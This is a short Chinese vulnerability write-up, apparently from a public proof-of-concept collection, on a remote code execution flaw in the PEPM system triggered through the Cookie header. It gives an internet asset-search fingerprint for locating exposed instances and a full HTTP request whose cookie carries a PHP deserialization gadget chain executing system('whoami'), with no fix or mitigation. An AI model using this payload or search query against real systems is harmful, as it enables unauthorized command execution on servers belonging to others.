# PEPM系统Cookie请求头存在远程代码执行漏洞

# 一、漏洞简介
PEPM系统Cookie请求头存在远程代码执行漏洞

# 二、影响版本
+ PEPM

# 三、资产测绘
```plain
header="pepm"
```

![1722876330531-484a89d0-0030-4c38-8bd0-27e97936adc2.png](./img/tlp0y6fKN60Y2V4W/1722876330531-484a89d0-0030-4c38-8bd0-27e97936adc2-803339.png)

# 四、漏洞复现
```plain
GET / HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Cookie: auth=a%3A1%3A%7Bi%3A0%3BO%3A18%3A%22phpseclib%5CNet%5CSSH1%22%3A2%3A%7Bs%3A6%3A%22bitmap%22%3Bi%3A1%3Bs%3A6%3A%22crypto%22%3BO%3A19%3A%22phpseclib%5CCrypt%5CAES%22%3A8%3A%7Bs%3A6%3A%22bitmap%22%3Bi%3A1%3Bs%3A6%3A%22crypto%22%3Bi%3A1%3Bs%3A10%3A%22block_size%22%3BN%3Bs%3A12%3A%22inline_crypt%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22phpseclib%5CCrypt%5CTripleDES%22%3A6%3A%7Bs%3A10%3A%22block_size%22%3Bs%3A45%3A%221%29%7B%7D%7D%7D%3B%20ob_clean%28%29%3Bsystem%28%27whoami%27%29%3Bdie%28%29%3B%20%3F%3E%22%3Bs%3A12%3A%22inline_crypt%22%3BN%3Bs%3A16%3A%22use_inline_crypt%22%3Bi%3A1%3Bs%3A7%3A%22changed%22%3Bi%3A0%3Bs%3A6%3A%22engine%22%3Bi%3A1%3Bs%3A4%3A%22mode%22%3Bi%3A1%3B%7Di%3A1%3Bs%3A26%3A%22_createInlineCryptFunction%22%3B%7Ds%3A16%3A%22use_inline_crypt%22%3Bi%3A1%3Bs%3A7%3A%22changed%22%3Bi%3A0%3Bs%3A6%3A%22engine%22%3Bi%3A1%3Bs%3A4%3A%22mode%22%3Bi%3A1%3B%7D%7D%7D
Connection: close
```

![1722876371652-4bd33bb8-1302-438d-83bd-ef957bef3490.png](./img/tlp0y6fKN60Y2V4W/1722876371652-4bd33bb8-1302-438d-83bd-ef957bef3490-729318.png)



> 更新: 2024-08-12 17:15:57  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tqiapo8b4781kprv>